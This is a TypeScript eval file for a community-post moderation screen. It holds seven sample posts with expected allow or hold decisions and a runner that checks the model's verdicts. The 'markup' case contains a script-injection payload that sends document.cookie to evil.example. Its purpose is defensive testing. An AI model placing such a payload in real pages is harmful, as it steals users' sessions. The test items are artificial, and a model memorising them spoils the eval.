/**
 * Community screen eval (@foundmill/agents `community-screen`, route `moderation`, Haiku; audit #28). Each case is a
 * community post with the decision a person would expect: everyday founder talk is allowed; harassment, someone's
 * personal data, markup and fake reviews are held for a moderator. `runModerationCase` drives the api's path
 * (deterministic checks, then the model, combined by `communityScreenVerdict`) with any model client: live in
 * `pnpm evals`, the mock in the unit suite. A false hold costs a moderator a minute; a false allow puts abuse in front of
 * every member, so the live gate is stricter on what must be held.
 */
import { buildCommunityScreenRequest, communityScreenLocalFlags, communityScreenVerdict } from "@foundmill/agents";
import { APP_NAME } from "@foundmill/config";
import { ModerationOutput, type ModelClient } from "@foundmill/models";

export interface ModerationCase {
  id: string;
  text: string;
  expect: "allow" | "hold";
}

export const MODERATION_CASES: readonly ModerationCase[] = [
  { id: "clean-onboarding", text: "We moved onboarding to a five-step checklist and activation went from 31% to 44% in six weeks. Happy to share the checklist with anyone here.", expect: "allow" },
  { id: "clean-pricing", text: "Has anyone priced annual plans for operations teams? We are torn between a 15% and a 20% discount and would love to hear what worked.", expect: "allow" },
  { id: "clean-hiring", text: "Looking for advice on hiring a first support person. Did you start part time, or wait until the queue was full?", expect: "allow" },
  { id: "harassment", text: "You are an idiot and your product is worthless. Shut up and stop posting here, loser.", expect: "hold" },
  { id: "personal-data", text: "If you want to complain about Dana, her home number is +1 415 555 0100 and her email is dana.k@example.com.", expect: "hold" },
  { id: "markup", text: "Great thread <script>document.location='https://evil.example/?c='+document.cookie</script>", expect: "hold" },
  { id: "fake-reviews", text: "We sell fake reviews for app stores, 50 five-star reviews for $99. Sock puppets included, nobody can tell.", expect: "hold" },
];

export interface ModerationCaseResult {
  caseId: string;
  expected: ModerationCase["expect"];
  decision: "allow" | "hold" | null;
  flags: string[];
  passed: boolean;
  costMinor: number;
  error?: string;
}

/** Screens one case the way the api does and compares the decision with the expected one. */
export async function runModerationCase(c: ModerationCase, client: ModelClient): Promise<ModerationCaseResult> {
  try {
    const request = buildCommunityScreenRequest({ text: c.text, kind: "community_post", communityName: "Fintech ops founders", appName: APP_NAME });
    const result = await client.complete({ ...request, schema: ModerationOutput, scope: `eval:moderation:${c.id}` });
    const verdict = communityScreenVerdict(communityScreenLocalFlags(c.text), result.json as ModerationOutput);
    return { caseId: c.id, expected: c.expect, decision: verdict.decision, flags: verdict.flags, passed: verdict.decision === c.expect, costMinor: result.cost.costMinorInt };
  } catch (err) {
    return { caseId: c.id, expected: c.expect, decision: null, flags: [], passed: false, costMinor: 0, error: err instanceof Error ? err.message : String(err) };
  }
}
